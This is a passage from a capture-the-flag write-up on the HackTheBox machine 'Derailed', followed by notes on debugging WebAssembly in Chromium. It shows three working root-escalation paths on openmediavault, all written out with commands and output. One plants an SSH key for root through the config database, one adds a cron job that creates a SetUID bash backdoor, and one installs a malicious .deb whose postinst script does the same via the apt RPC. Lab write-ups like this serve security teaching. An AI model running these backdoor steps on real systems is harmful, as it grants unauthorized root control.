    "uuid": "b3f760a6-636d-4580-848c-96eb2fe8d64a",
    "label": "",
    "type": "ext4",
    "blocks": "8089272",
    "mounted": true,
    "mountpoint": "/",
    "used": "5.71 GiB",
    "available": "2045493248",
    "size": "8283414528",
    "percentage": 75,
    "description": "/dev/sda1 [EXT4, 5.71 GiB (75%) used, 1.90 GiB available]",
    "propposixacl": true,
    "propquota": true,
    "propresize": true,
    "propfstab": true,
    "propcompress": false,
    "propautodefrag": false,
    "hasmultipledevices": false,
    "devicefiles": [
      "/dev/sda1"
    ],
    "comment": "",
    "_readonly": false,
    "_used": false,
    "propreadonly": false,
    "usagewarnthreshold": 85
  }
]

```

The [link to the various RPC modules](https://github.com/openmediavault/openmediavault/tree/master/deb/openmediavault/usr/share/openmediavault/engined/rpc) is just a folder of `.inc` PHP files:

![image-20230720161904255](/img/image-20230720161904255.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

Each has an initialize function that registers the different methods that can be called in that module. For example, in `apt.inc`:

![image-20230720162036166](/img/image-20230720162036166.png)

The functions are somewhat documented as far as what they require.

Going through the list of RPCs, the following jump out as interesting:
- apt - See below.
- config - See below.
- cron - Has a `set` method, but doesn’t seem to set the command itself.
- exec - Can enumerate running processes, but not start them.
- filesystemmgmt - Doesn’t give any file read ability, but rather creating and mounting file systems. Might still be something here, but I didn’t find it.
- folderbrowser - Only lists files in a directory, no read.
- rsync - There is a `get` method, but it requires a UUID for an object I don’t know about. Still could be something there, but I didn’t pursue it.
- services - Only has a get status on a service.
- ssh - Get and set configuration settings for SSH. Didn’t see an obvious way to exploit, but there could be something for sure.
- system - Can reboot the system. Everything else is more status reporting.
- usermgmt - Only change password function takes it from the context of the current user. `setUser` checks if it is a system account and bails.

### config RPC to Modify DB

#### Write root SSH Key

openmediavault is meant to hold SSH keys for users on the system so that you can connect to the NAS. There is a user’s section in `config.xml`:

```

      <users>
        <!--
                                <user>
                                        <uuid>xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx</uuid>
                                        <name>xxx</name>
                                        <email>xxx</email>
                                        <disallowusermod>0</disallowusermod>
                                        <sshpubkeys>
                                                <sshpubkey>|xxx</sshpubkey>
                                        </sshpubkeys>
                                </user>
                                -->
        <user>
          <uuid>30386ffe-014c-4970-b68b-b4a2fb0a6ec9</uuid>
          <name>rails</name>
          <email></email>
          <disallowusermod>0</disallowusermod>
          <sshpubkeys></sshpubkeys>
        </user>
        <user>
          <uuid>e3f59fea-4be7-4695-b0d5-560f25072d4a</uuid>
          <name>test</name>
          <email></email>
          <disallowusermod>0</disallowusermod>
          <sshpubkeys></sshpubkeys>
        </user>
      </users>

```

It has a commented out example, as well as two users, rails and test. The example shows where an SSH public key could be stored.

[This page](https://docs.openmediavault.org/en/6.x/administration/services/ssh.html) has information about the format of the SSH key required. It has an `ssh-keygen` command to read a “standard” public key and output it in the required RFC 4716 format:

```

oxdf@hacky$ ssh-keygen -e -f ~/keys/ed25519_gen.pub 
---- BEGIN SSH2 PUBLIC KEY ----
Comment: "256-bit ED25519, converted by oxdf@hacky from OpenSSH"
AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d
---- END SSH2 PUBLIC KEY ----

```

I’m using my small ED25519 key, but RSA format would work fine too.

I’ll edit the test user, replacing the name with “root”, and adding in a key:

```

        <user>
          <uuid>30386ffe-014c-4970-b68b-b4a2fb0a6ec9</uuid>
          <name>rails</name>
          <email></email>
          <disallowusermod>0</disallowusermod>
          <sshpubkeys></sshpubkeys>
        </user>
        <user>
          <uuid>e3f59fea-4be7-4695-b0d5-560f25072d4a</uuid>
          <name>root</name>
          <email></email>
          <disallowusermod>0</disallowusermod>
          <sshpubkeys>
            <sshpubkey>---- BEGIN SSH2 PUBLIC KEY ----
Comment: "256-bit ED25519, converted by oxdf@hacky from OpenSSH"
AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d
---- END SSH2 PUBLIC KEY ----
</sshpubkey>
          </sshpubkeys>
        </user>

```

I’ll make sure it went in correctly by reading it back using `omv-confdbadm`:

```

openmediavault-webgui@derailed:/etc/openmediavault$ /sbin/omv-confdbadm read --prettify conf.system.usermngmnt.user
[
    {
        "disallowusermod": false,
        "email": "",
        "name": "rails",
        "sshpubkeys": {
            "sshpubkey": []
        },
        "uuid": "30386ffe-014c-4970-b68b-b4a2fb0a6ec9"
    },
    {
        "disallowusermod": false,
        "email": "",
        "name": "root",
        "sshpubkeys": {
            "sshpubkey": [
                "---- BEGIN SSH2 PUBLIC KEY ----\nComment: \"256-bit ED25519, converted by oxdf@hacky from OpenSSH\"\nAAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d\n---- END SSH2 PUBLIC KEY ----\n"
            ]
        },
        "uuid": "e3f59fea-4be7-4695-b0d5-560f25072d4a"
    }
]

```

For this to work, I need the SSH module to refresh. This is where the RPC comes in. I’ll use the `config` RPC to reload the SSH module:

```

openmediavault-webgui@derailed:/etc/openmediavault$ /usr/sbin/omv-rpc -u admin "config" "applyChanges" "{ \"modules\": [\"ssh\"], \"force\": true }"
null

```

Once that completes, I can log in as root with my key:

```

oxdf@hacky$ ssh -i ~/keys/ed25519_gen root@10.10.11.190
Linux derailed 5.19.0-0.deb11.2-amd64 #1 SMP PREEMPT_DYNAMIC Debian 5.19.11-1~bpo11+1 (2022-10-03) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Jul 20 15:54:15 2023 from 10.10.14.6
root@derailed:~#

```

Interestingly, this file does not get written to `/root/.ssh/authorized_keys` or anything, but rather is managed by openmediavault as a separate authentication on SSH connections.

#### Crontab

The same thing works for making a `crontab`. The `crontab` section of the “database” starts with only a commented out example:

```

    <crontab>
      <!--
                        <job>
                                <uuid>xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx</uuid>
                                <enable>0|1</enable>
                                <execution>exactly|hourly|daily|weekly|monthly|yearly|reboot</execution>
                                <sendemail>0|1<sendemail>
                                <type>reboot|shutdown|standby|userdefined</type>
                                <comment>xxx</comment>
                                <minute>[00-59|*]</minute>
                                <everynminute>0|1</everynminute>
                                <hour>[00-23|*]</hour>
                                <everynhour>0|1</everynhour>
                                <dayofmonth>[01-31|*]</dayofmonth>
                                <everyndayofmonth>0|1</everyndayofmonth>
                                <month>[01-12|*]</month>
                                <dayofweek>[1-7|*]</dayofweek>
                                <username>xxx</username>
                                <command>xxx</command>
                        </job>
                        -->
    </crontab>

```

I’ll copy it to make an uncommented version, and fill it in, with the following discoveries via trial and error:
- A `uuid` is required and it has to be a valid UUID, but any UUID seems to work. I’ll generate one [here](https://www.uuidgenerator.net/version4).
- I’ll use `exactly` as the `execution` as it was better than any of the others.
- I’ll use `userdefined` as the type as it’s better than the others.
- I’ll set `*` for all the items, and then leave the `everyminute`, `everyhour`, and `everydayofmonth` fields as `0`. I tried it as `1` and it didn’t seem to work.
- I’ll set the command to create a SetUID `bash` binary.

```

<job>
    <uuid>b8068c15-0d5e-4d38-a7d0-6885a31c8a53</uuid>
    <enable>1</enable>
    <execution>exactly</execution>
    <sendemail>0</sendemail>
    <type>userdefined</type>
    <comment>xxx</comment>
    <minute>*</minute>
    <everynminute>0</everynminute>
    <hour>*</hour>
    <everynhour>0</everynhour>
    <dayofmonth>*</dayofmonth>
    <everyndayofmonth>0</everyndayofmonth>
    <month>*</month>
    <dayofweek>*</dayofweek>
    <username>root</username>
    <command>cp /bin/bash /tmp/0xdf; chmod 4777 /tmp/0xdf</command>
</job>

```

After saving, I’ll read back the data using `omv-confdbadm`:

```

openmediavault-webgui@derailed:/etc/openmediavault$ /sbin/omv-confdbadm read --prettify conf.system.cron.job
[
    {
        "command": "cp /bin/bash /tmp/0xdf; chmod 4777 /tmp/0xdf",
        "comment": "xxx",
        "dayofmonth": "*",
        "dayofweek": "*",
        "enable": true,
        "everyndayofmonth": false,
        "everynhour": false,
        "everynminute": false,
        "execution": "exactly",
        "hour": "*",
        "minute": "*",
        "month": "*",
        "sendemail": false,
        "type": "userdefined",
        "username": "root",
        "uuid": "b8068c15-0d5e-4d38-a7d0-6885a31c8a53"
    }
]

```

There’s a typo in the example where the closing `sendmail` tag is missing the `/`. Not having this will fail with `omv-confdbadm` (which is why it’s nice to have as a check).

With a valid DB, I’ll reload the `cron` module using RPC:

```

openmediavault-webgui@derailed:/etc/openmediavault$ /usr/sbin/omv-rpc -u admin "config" "applyChanges" "{ \"modules\": [\"cron\"], \"force\": true }"
null

```

I’ll wait a minute, and then my `bash` backdoor is present:

```

openmediavault-webgui@derailed:/etc/openmediavault$ ls -l /tmp/0xdf 
-rwsrwxrwx 1 root root 1234376 Jul 20 16:51 /tmp/0xdf

```

And I can run it to get a root shell (euid = 0):

```

openmediavault-webgui@derailed:/etc/openmediavault$ /tmp/0xdf -p
0xdf-5.1# id
uid=999(openmediavault-webgui) gid=996(openmediavault-webgui) euid=0(root) groups=996(openmediavault-webgui),998(openmediavault-engined),999(openmediavault-config)

```

Looking at how this works, I’ll find a few files in `/etc/cron.d` that are managed by openmediavault:

```

root@derailed:/etc/cron.d# ls
anacron  e2scrub_all  mdadm  openmediavault-mkrrdgraph  openmediavault-powermngmt  openmediavault-userdefined  php

```

The `openmediavault-userdefined` on has my job:

```

root@derailed:/etc/cron.d# cat openmediavault-userdefined 
# This file is auto-generated by openmediavault (https://www.openmediavault.org)
# WARNING: Do not edit this file, your changes will get lost.
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
# m h dom mon dow user    command
* * * * * root /var/lib/openmediavault/cron.d/userdefined-b8068c15-0d5e-4d38-a7d0-6885a31c8a53 >/dev/null 2>&1

```

That UUID matches what I put in the database, and it’s set to run every minute. `userdefined-b8068c15-0d5e-4d38-a7d0-6885a31c8a53` has the commands:

```

root@derailed:/etc/cron.d# cat /var/lib/openmediavault/cron.d/userdefined-b8068c15-0d5e-4d38-a7d0-6885a31c8a53
#!/bin/sh -l
# This file is auto-generated by openmediavault (https://www.openmediavault.org)
# WARNING: Do not edit this file, your changes will get lost.
cp /bin/bash /tmp/0xdf; chmod 4777 /tmp/0xdf

```

If I change these files, they actually get set back by openmediavault, kept in sync with it’s “DB”.

### apt RPC

#### RPC Info

The intended path for this box is to make a malicious package and install it with the apt RPC. The code comments show that it takes an array of package names to install:

![image-20230720170120234](/img/image-20230720170120234.png)

I’ll try creating a package and passing the path as the `packages` value.

#### Create Package

There’s a ton of guides out there about how to create a Deb package. I’ve shown this before in [OneTwoSeven](/2019/08/31/htb-onetwoseven.html#create-poisoned-package). In that example, I downloaded and modified an existing package, ticking up the version so it would install from my server.

Here I’ll just create a dummy empty package with a `postinst` script that will run after install.

I’ll create a directory to work from, and inside that a `DEBIAN` directory:

```

openmediavault-webgui@derailed:/dev/shm$ mkdir -p 0xdf/DEBIAN

```

Then I create the `control` file:

```

openmediavault-webgui@derailed:/dev/shm$ cat 0xdf/DEBIAN/control
Package: 0xdf
Source: 0xdf
Version: 0.0.1
Architecture: amd64
Maintainer: 0xdf
Description: Does nothing at all...

```

Next I’ll create the `postinst` script:

```

openmediavault-webgui@derailed:/dev/shm$ cat 0xdf/DEBIAN/postinst
#!/bin/bash
cp /bin/bash /tmp/0xdf2
chmod 6777 /tmp/0xdf2

```

I’ll also need to make sure it’s set as executable:

```

openmediavault-webgui@derailed:/dev/shm$ chmod +x 0xdf/DEBIAN/postinst

```

Now `dpkg-deb` will build it into a `.deb` file:

```

openmediavault-webgui@derailed:/dev/shm$ dpkg-deb --build 0xdf
dpkg-deb: building package '0xdf' in '0xdf.deb'.
openmediavault-webgui@derailed:/dev/shm$ ls
0xdf  0xdf.deb 

```

#### Install with apt RPC

I’ll invoke the RPC, and it returns a strange path in `/tmp`:

```

openmediavault-webgui@derailed:/dev/shm$ /usr/sbin/omv-rpc -u admin apt install '{ "packages": ["/dev/shm/0xdf.deb"] }'
"\/tmp\/bgstatusWWgLhR"

```

But still, `/tmp/0xdf2` is there and SetUID:

```

openmediavault-webgui@derailed:/dev/shm$ ls -l /tmp/0xdf2 
-rwsrwsrwx 1 root root 1234376 Jul 20 17:12 /tmp/0xdf2
openmediavault-webgui@derailed:/dev/shm$ /tmp/0xdf2 -p
0xdf2-5.1# id
uid=999(openmediavault-webgui) gid=996(openmediavault-webgui) euid=0(root) egid=0(root) groups=0(root),996(openmediavault-webgui),998(openmediavault-engined),999(openmediavault-config)

```

Regardless of how I got root, I can read the flag:

```

0xdf2-5.1# cat /root/root.txt
38939b28************************

```

## Beyond Root - Debugging WebAssembly

### Video

I’ll explore WASM debugging in [this video](https://www.youtube.com/watch?v=BTLLPnW4t5s):

### Setup

I’m going to be using Chromium, as had a really hard time getting Firefox to step into WASM.

I’ve already found [above](#editor-loader) where the page’s JavaScript is making a call to `ccall` for the `display` function, passing in two strings, “created” and “author”. I’ll place a break there (around line 118 of the page), and run to it.

### Deeper Into the JavaScript

Stepping into `ccall` actually leads into `display.js`, which is generated by Escripten when the site is built. `ccall` is responsible for converting the objects like strings into pointers in memory that the C function can work with. Looking down towards the bottom of the function at line 774 there’s this line:

```

    var ret = func.apply(null, cArgs);

```

`func` is a JavaScript wrapper function funto call the address of `display` in memory, and it’s being called with `cArgs`. If I break here and run to it, `cArgs` is an array of two ints, as shown here in the console:

![image-20230721142827419](/img/image-20230721142827419.png)

These are the memory addresses of the two strings. The `UTF8ToString` function will show the string at each address:

![image-20230721143028685](/img/image-20230721143028685.png)

`func` is getting the assembly from memory and calling the required function:

![image-20230721143407141](/img/image-20230721143407141.png)

I’ll step into `func`, and run to the `return asm[name].apply(null, arguments)` at the end. Stepping into that is where I hit actually web assembly:

![image-20230721143555344](/img/image-20230721143555344.png)

### Debugging WebAssembly

#### Background

WebAssembly is stack-based, where calls to `.get` push items onto the stack, and `.set` pops a value off and stored it in that variable. Function calls also use the stack for arguments and returning results.

In Chromium dev tools, it shows where I am (green highlighted line), as well as the stack (currently empty) and the variables in use on the right:

![image-20230721143825265](/img/image-20230721143825265.png)

#### Display Overflow

I won’t get too deep into the actual WASM and what it is legitimately doing to format the page with the post metadata, but I’ll work into it enough to find the overflow.

Some trial and error shows that `$func4` is `strcpy`. This code calls `strcpy` to copy the date string onto the stack, then moves 48 bytes up the stack and calls `strcpy` to copy the name. As it’s an unsafe `strcpy` (which I can tell by trying it and verifying that there’s no length check), the username string writes into the date string.

![image-20230721144632657](/img/image-20230721144632657.png)